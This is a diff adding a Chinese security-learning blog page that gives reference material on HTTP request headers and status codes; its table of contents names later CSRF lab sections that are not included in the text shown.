@@ -1,0 +1,1197 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.23.0" theme-name="Stellar" theme-version="1.23.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>HTTP&&CSRF - SafeKiller Zone</title>
+
+  
+    <meta name="description" content="HTTP协议    CSRF漏洞    Kali桌面美化   HTTP协议请求标记头   协议头字段名 说明 示例 状态    Accept 能够接受的回应内容类型（Content-Types） Accept: text&#x2F;plain 常设   Accept-Charset 能够接受的字符集 Accept-Charset: utf-8 常设   Accept-Encoding 能够接受的编码方">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP&amp;&amp;CSRF">
+<meta property="og:url" content="https://jiangjiyue.github.io/p/csrfhttpskali/index.html">
+<meta property="og:site_name" content="SafeKiller Zone">
+<meta property="og:description" content="HTTP协议    CSRF漏洞    Kali桌面美化   HTTP协议请求标记头   协议头字段名 说明 示例 状态    Accept 能够接受的回应内容类型（Content-Types） Accept: text&#x2F;plain 常设   Accept-Charset 能够接受的字符集 Accept-Charset: utf-8 常设   Accept-Encoding 能够接受的编码方">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827091622243.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827092420828.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827092659256.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827093043237.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827093401048.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827093821989.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827094000330.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827094310076.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827095422375.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827103950739.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827104317186.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827104442975.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827104852089.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827105234534.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827110025209.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827110213730.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827110636168.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827112156674.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827161149807.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827142747147.png">
+<meta property="article:published_time" content="2022-08-30T14:15:30.000Z">
+<meta property="article:modified_time" content="2024-01-25T12:41:09.272Z">
+<meta property="article:author" content="Kill3r">
+<meta property="article:tag" content="Linux, Nginx, Zabbix, ELK, Security, Penetration">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827091622243.png">
+  
+  
+  
+  <meta name="keywords" content="Linux, Nginx, Zabbix, ELK, Security, Penetration">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="https://jiangjiyue.github.io/images/favicon.ico">
+  
+
+  
+
+  
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://jiangjiyue.github.io/images/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub cap">连自己喜欢的人都留不住</div></a></div>
+
+<nav class="menu dis-select"><a class="nav-item active" href="/"><i class="fa-solid fa-house-chimney"></i></a><a class="nav-item" href="/wiki/"><i class="fa-solid fa-book"></i></a><a class="nav-item" href="/bookmark/"><i class="fa-solid fa-icons"></i></a><a class="nav-item" href="/friends/"><i class="fa-brands fa-squarespace"></i></a><a class="nav-item" href="/about/"><i class="fa-solid fa-plus fa-flip"></i></a></nav>
+</header>
+
+
+<div class="widgets">
+
+
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" placeholder="站内搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+<widget class="widget-wrapper toc single" id="data-toc" collapse="false"><div class="widget-header cap dis-select"><span class="name">HTTP&&CSRF</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP%E5%8D%8F%E8%AE%AE"><span class="toc-text">HTTP协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%A0%87%E8%AE%B0%E5%A4%B4"><span class="toc-text">请求标记头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%8D%E5%BA%94%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-text">响应状态码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1xx-%E6%B6%88%E6%81%AF"><span class="toc-text">1xx 消息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2xx-%E6%88%90%E5%8A%9F"><span class="toc-text">2xx 成功</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3xx-%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-text">3xx 重定向</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4xx-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%94%99%E8%AF%AF"><span class="toc-text">4xx 客户端错误</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5xx-%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%94%99%E8%AF%AF"><span class="toc-text">5xx 服务器错误</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%8D%E5%BA%94%E6%A0%87%E8%AE%B0%E5%A4%B4"><span class="toc-text">响应标记头</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E6%BC%8F%E6%B4%9E"><span class="toc-text">CSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">漏洞利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-text">CSRF利用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C"><span class="toc-text">漏洞实验</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%8E%E7%BA%A7"><span class="toc-text">低级</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%88%86%E6%9E%90"><span class="toc-text">请求分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E5%BB%BAPOC"><span class="toc-text">构建POC</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E7%BA%A7"><span class="toc-text">中级</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%88%86%E6%9E%90-1"><span class="toc-text">请求分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E5%BB%BAPOC-1"><span class="toc-text">构建POC</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7-%E4%B8%8D%E5%8F%AF%E8%83%BD"><span class="toc-text">高级(不可能)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E9%AB%98%E7%BA%A7-%E4%B8%8D%E5%8F%AF%E8%83%BD"><span class="toc-text">特高级(不可能)</span></a></li></ol></li></ol></li></ol></div></div></widget>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+<div class="bread-nav fs12"><div class="left"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/">渗透学习路线</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/OWASP-TOP-10/">OWASP TOP 10</a></div><div id="post-meta"><span class="author">发布于</span>
+    <span class="created"><time datetime="2022-08-30T14:15:30.000Z">2022-08-30</time></span>
+    
+    <span class="updated">，更新于&nbsp;<time datetime="2024-01-25T12:41:09.272Z">2024-01-25</time></span>
+    </div></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>HTTP&&CSRF</span></h1>
+<ul>
+<li><p><input checked="" disabled="" type="checkbox"> 
+HTTP协议</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+CSRF漏洞</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+Kali桌面美化</p>
+</li>
+</ul>
+<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="请求标记头"><a href="#请求标记头" class="headerlink" title="请求标记头"></a>请求标记头</h3><table>
+<thead>
+<tr>
+<th align="center">协议头字段名</th>
+<th align="center">说明</th>
+<th align="center">示例</th>
+<th align="center">状态</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Accept</td>
+<td align="center">能够接受的回应内容类型（Content-Types）</td>
+<td align="center"><code>Accept: text/plain</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Accept-Charset</td>
+<td align="center">能够接受的字符集</td>
+<td align="center"><code>Accept-Charset: utf-8</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Accept-Encoding</td>
+<td align="center">能够接受的编码方式列表.</td>
+<td align="center"><code>Accept-Encoding: gzip, deflate</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Accept-Language</td>
+<td align="center">能够接受的回应内容的自然语言列表.</td>
+<td align="center"><code>Accept-Language: en-US</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Accept-Datetime</td>
+<td align="center">能够接受的按照时间来表示的版本</td>
+<td align="center"><code>Accept-Datetime: Thu, 31 May 2007 20:35:00 GMT</code></td>
+<td align="center">临时</td>
+</tr>
+<tr>
+<td align="center">Authorization</td>
+<td align="center">用于超文本传输协议的认证的认证信息</td>
+<td align="center"><code>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Cache-Control</td>
+<td align="center">用来指定在这次的请求&#x2F;响应链中的所有缓存机制 都必须 遵守的指令</td>
+<td align="center"><code>Cache-Control: no-cache</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Connection</td>
+<td align="center">该浏览器想要优先使用的连接类型</td>
+<td align="center"><code>Connection: keep-alive``Connection: Upgrade</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Cookie</td>
+<td align="center">之前由服务器通过 Set- Cookie （下文详述）发送的一个 超文本传输协议Cookie</td>
+<td align="center"><code>Cookie: $Version=1; Skin=new;</code></td>
+<td align="center">常设: 标准</td>
+</tr>
+<tr>
+<td align="center">Content-Length</td>
+<td align="center">以 八位字节数组 （8位的字节）表示的请求体的长度</td>
+<td align="center"><code>Content-Length: 348</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-MD5</td>
+<td align="center">请求体的内容的二进制 MD5 散列值,以 Base64 编码的结果</td>
+<td align="center"><code>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</code></td>
+<td align="center">过时的[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-9">9]</a></td>
+</tr>
+<tr>
+<td align="center">Content-Type</td>
+<td align="center">请求体的MIME类型 （用于POST和PUT请求中）</td>
+<td align="center"><code>Content-Type: application/x-www-form-urlencoded</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Date</td>
+<td align="center">发送该消息的日期和时间(按照 <code>RFC 7231</code> 中定义的”超文本传输协议日期”格式来发送)</td>
+<td align="center"><code>Date: Tue, 15 Nov 1994 08:12:31 GMT</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Expect</td>
+<td align="center">表明客户端要求服务器做出特定的行为</td>
+<td align="center"><code>Expect: 100-continue</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">From</td>
+<td align="center">发起此请求的用户的邮件地址</td>
+<td align="center"><code>From: user@example.com</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Host</td>
+<td align="center">服务器的域名(用于虚拟主机 ),以及服务器所监听的[传输控制协议)端口号.如果所请求的端口是对应的服务的标准端口,则端口号可被省略.自超文件传输协议版本1.1（<code>HTTP/1.1</code>）开始便是必需字段.</td>
+<td align="center"><code>Host: zh.fsec.io:80``Host: zh.fsec.io</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">If-Match</td>
+<td align="center">仅当客户端提供的实体与服务器上对应的实体相匹配时,才进行对应的操作.主要作用时,用作像 <code>PUT</code> 这样的方法中,仅当从用户上次更新某个资源以来,该资源未被修改的情况下,才更新该资源.</td>
+<td align="center"><code>If-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">If-Modified-Since</td>
+<td align="center">允许在对应的内容未被修改的情况下返回304未修改（<code>304 Not Modified</code> ）</td>
+<td align="center"><code>If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">If-None-Match</td>
+<td align="center">允许在对应的内容未被修改的情况下返回304未修改（ <code>304 Not Modified</code> ）,参考 超文本传输协议的实体标记</td>
+<td align="center"><code>If-None-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">If-Range</td>
+<td align="center">如果该实体未被修改过,则向我发送我所缺少的那一个或多个部分；否则,发送整个新的实体</td>
+<td align="center"><code>If-Range: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">If-Unmodified-Since</td>
+<td align="center">仅当该实体自某个特定时间已来未被修改的情况下,才发送回应.</td>
+<td align="center"><code>If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 GMT</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Max-Forwards</td>
+<td align="center">限制该消息可被代理及网关转发的次数.</td>
+<td align="center"><code>Max-Forwards: 10</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Origin</td>
+<td align="center">发起一个针对 跨来源资源共享 的请求（要求服务器在回应中加入一个‘访问控制-允许来源’（’<code>Access-Control-Allow-Origin</code>‘）字段）.</td>
+<td align="center"><code>Origin: http://www.example-social-network.com</code></td>
+<td align="center">常设: 标准</td>
+</tr>
+<tr>
+<td align="center">Pragma</td>
+<td align="center">与具体的实现相关,这些字段可能在请求&#x2F;回应链中的任何时候产生多种效果.</td>
+<td align="center"><code>Pragma: no-cache</code></td>
+<td align="center">常设但不常用</td>
+</tr>
+<tr>
+<td align="center">Proxy-Authorization</td>
+<td align="center">用来向代理进行认证的认证信息.</td>
+<td align="center"><code>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Range</td>
+<td align="center">仅请求某个实体的一部分.字节偏移以0开始.参见字节服务.</td>
+<td align="center"><code>Range: bytes=500-999</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Referer</td>
+<td align="center">表示浏览器所访问的前一个页面,正是那个页面上的某个链接将浏览器带到了当前所请求的这个页面.</td>
+<td align="center"><code>Referer: http://zh.fsec.io/wiki/Main_Page</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">TE</td>
+<td align="center">浏览器预期接受的传输编码方式：可使用回应协议头 Transfer-Encoding 字段中的值；另外还可用”trailers”（与”分块 “传输方式相关）这个值来表明浏览器希望在最后一个尺寸为0的块之后还接收到一些额外的字段.</td>
+<td align="center"><code>TE: trailers, deflate</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">User-Agent</td>
+<td align="center">浏览器的浏览器身份标识字符串</td>
+<td align="center"><code>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/21.0</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Upgrade</td>
+<td align="center">要求服务器升级到另一个协议.</td>
+<td align="center"><code>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Via</td>
+<td align="center">向服务器告知,这个请求是由哪些代理发出的.</td>
+<td align="center"><code>Via: 1.0 fred, 1.1 example.com (Apache/1.1)</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Warning</td>
+<td align="center">一个一般性的警告,告知,在实体内容体中可能存在错误.</td>
+<td align="center"><code>Warning: 199 Miscellaneous warning</code></td>
+<td align="center">常设</td>
+</tr>
+</tbody></table>
+<h3 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h3><h5 id="1xx-消息"><a href="#1xx-消息" class="headerlink" title="1xx 消息"></a>1xx 消息</h5><p>这一类型的状态码,代表请求已被接受,需要继续处理.这类响应是临时响应,只包含状态行和某些可选的响应头信息,并以空行结束.由于HTTP&#x2F;1.0协议中没有定义任何1xx状态码,所以除非在某些试验条件下,服务器禁止向此类客户端发送1xx响应.[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#cite_note-3">3]</a> 这些状态码代表的响应都是信息性的,标示客户应该等待服务器采取进一步行动.</p>
+<ul>
+<li><p>100 Continue</p>
+<p>服务器已经接收到请求头,并且客户端应继续发送请求主体（在需要发送身体的请求的情况下：例如,POST请求）,或者如果请求已经完成,忽略这个响应.服务器必须在请求完成后向客户端发送一个最终响应.要使服务器检查请求的头部,客户端必须在其初始请求中发送<code>Expect: 100-continue</code>作为头部,并在发送正文之前接收<code>100 Continue</code>状态代码.响应代码417期望失败表示请求不应继续.</p>
+</li>
+<li><p>101 Switching Protocols</p>
+<p>服务器已经理解了客户端的请求,并将通过Upgrade消息头通知客户端采用不同的协议来完成这个请求.在发送完这个响应最后的空行后,服务器将会切换到在Upgrade消息头中定义的那些协议</p>
+<p>只有在切换新的协议更有好处的时候才应该采取类似措施.例如,切换到新的HTTP版本（如HTTP&#x2F;2）比旧版本更有优势,或者切换到一个实时且同步的协议（如WebSocket）以传送利用此类特性的资源.</p>
+</li>
+<li><p>102 Processing（WebDAV RFC 2518）</p>
+<p>WebDAV请求可能包含许多涉及文件操作的子请求,需要很长时间才能完成请求.该代码表示服务器已经收到并正在处理请求,但无响应可用.[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#cite_note-RFC_2518-5">5]</a>这样可以防止客户端超时,并假设请求丢失.</p>
+</li>
+<li><p>103 Early Hints</p>
+<p>用来在最终的HTTP消息之前返回一些响应头.</p>
+</li>
+</ul>
+<h5 id="2xx-成功"><a href="#2xx-成功" class="headerlink" title="2xx 成功"></a>2xx 成功</h5><p>这一类型的状态码,代表请求已成功被服务器接收、理解、并接受.</p>
+<ul>
+<li><p>200 OK</p>
+<p>请求已成功,请求所希望的响应头或数据体将随此响应返回.实际的响应将取决于所使用的请求方法.在GET请求中,响应将包含与请求的资源相对应的实体.在POST请求中,响应将包含描述或操作结果的实体.</p>
+</li>
+<li><p>201 Created</p>
+<p>请求已经被实现,而且有一个新的资源已经依据请求的需要而创建,且其URI已经随Location头信息返回.假如需要的资源无法及时创建的话,应当返回202 Accepted’.</p>
+</li>
+<li><p>202 Accepted</p>
+<p>服务器已接受请求,但尚未处理.最终该请求可能会也可能不会被执行,并且可能在处理发生时被禁止.</p>
+</li>
+<li><p>203 Non-Authoritative Information（自HTTP &#x2F; 1.1起）</p>
+<p>服务器是一个转换代理服务器（transforming proxy,例如网络加速器）,以<code>200 OK</code>状态码为起源,但回应了原始响应的修改版本.</p>
+</li>
+<li><p>204 No Content</p>
+<p>服务器成功处理了请求,没有返回任何内容.在强制门户功能中,Wi-Fi设备连接到需要进行 Web 认证的 Wi-Fi 接入点时,通过访问一个能生成 HTTP 204 响应的的网站,如果能正常收到 204 响应,则代表无需 Web 认证,否则会弹出网页浏览器界面,显示出 Web 网页认证界面用于让用户认证登录.</p>
+</li>
+<li><p>205 Reset Content</p>
+<p>服务器成功处理了请求,但没有返回任何内容.与204响应不同,此响应要求请求者重置文档视图.[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#cite_note-12">12]</a></p>
+</li>
+<li><p>206 Partial Content RFC 7233</p>
+<p>服务器已经成功处理了部分GET请求.类似于FlashGet或者迅雷这类的HTTP下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载.</p>
+</li>
+<li><p>207 Multi-Status（WebDAV；RFC 4918</p>
+<p>代表之后的消息体将是一个XML消息,并且可能依照之前子请求数量的不同,包含一系列独立的响应代码.</p>
+</li>
+<li><p>208 Already Reported （WebDAV；RFC 5842）</p>
+<p>DAV绑定的成员已经在（多状态）响应之前的部分被列举,且未被再次包含.</p>
+</li>
+<li><p>226 IM Used （RFC 3229）</p>
+<p>服务器已经满足了对资源的请求,对实体请求的一个或多个实体操作的结果表示.</p>
+</li>
+</ul>
+<h5 id="3xx-重定向"><a href="#3xx-重定向" class="headerlink" title="3xx 重定向"></a>3xx 重定向</h5><p>这类状态码代表需要客户端采取进一步的操作才能完成请求.通常,这些状态码用来重定向,后续的请求地址（重定向目标）在本次响应的Location域中指明.[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#cite_note-iana_status_codes-2">2]</a></p>
+<p>当且仅当后续的请求所使用的方法是GET或者HEAD时,用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求.客户端应当自动监测无限循环重定向（例如：A→B→C→……→A或A→A）,因为这会导致服务器和客户端大量不必要的资源消耗.按照HTTP&#x2F;1.0版规范的建议,浏览器不应自动访问超过5次的重定向.</p>
+<ul>
+<li><p>300 Multiple Choices</p>
+<p>被请求的资源有一系列可供选择的回馈信息,每个都有自己特定的地址和浏览器驱动的商议信息.用户或浏览器能够自行选择一个首选的地址进行重定向.</p>
+<p>除非这是一个HEAD请求,否则该响应应当包括一个资源特性及地址的列表的实体,以便用户或浏览器从中选择最合适的重定向地址.这个实体的格式由Content-Type定义的格式所决定.浏览器可能根据响应的格式以及浏览器自身能力,自动作出最合适的选择.当然,RFC 2616规范并没有规定这样的自动选择该如何进行.</p>
+<p>如果服务器本身已经有了首选的回馈选择,那么在Location中应当指明这个回馈的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/URI">URI</a>；浏览器可能会将这个Location值作为自动重定向的地址.此外,除非额外指定,否则这个响应也是可缓存的.</p>
+</li>
+<li><p>301 Moved Permanently</p>
+<p>被请求的资源已永久移动到新位置,并且将来任何对此资源的引用都应该使用本响应返回的若干个URI之一.如果可能,拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址.除非额外指定,否则这个响应也是可缓存的.</p>
+<p>新的永久性的URI应当在响应的Location域中返回.除非这是一个HEAD请求,否则响应的实体中应当包含指向新的URI的超链接及简短说明.</p>
+<p>如果这不是一个GET或者HEAD请求,那么浏览器禁止自动进行重定向,除非得到用户的确认,因为请求的条件可能因此发生变化.</p>
+<p>注意：对于某些使用HTTP&#x2F;1.0协议的浏览器,当它们发送的POST请求得到了一个301响应的话,接下来的重定向请求将会变成GET方式.</p>
+</li>
+<li><p>302 Found</p>
+<p>要求客户端执行临时重定向（原始描述短语为“Moved Temporarily”）.[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#cite_note-RFC_1945-19">19]</a>由于这样的重定向是临时的,客户端应当继续向原有地址发送以后的请求.只有在Cache-Control或Expires中进行了指定的情况下,这个响应才是可缓存的.</p>
+<p>新的临时性的URI应当在响应的Location域中返回.除非这是一个HEAD请求,否则响应的实体中应当包含指向新的URI的超链接及简短说明.</p>
+<p>如果这不是一个GET或者HEAD请求,那么浏览器禁止自动进行重定向,除非得到用户的确认,因为请求的条件可能因此发生变化.</p>
+<p>注意：虽然RFC 1945和RFC 2068规范不允许客户端在重定向时改变请求的方法,但是很多现存的浏览器将302响应视作为303响应,并且使用GET方式访问在Location中规定的URI,而无视原先请求的方法.因此状态码303和307被添加了进来,用以明确服务器期待客户端进行何种反应.</p>
+</li>
+<li><p>303 See Other</p>
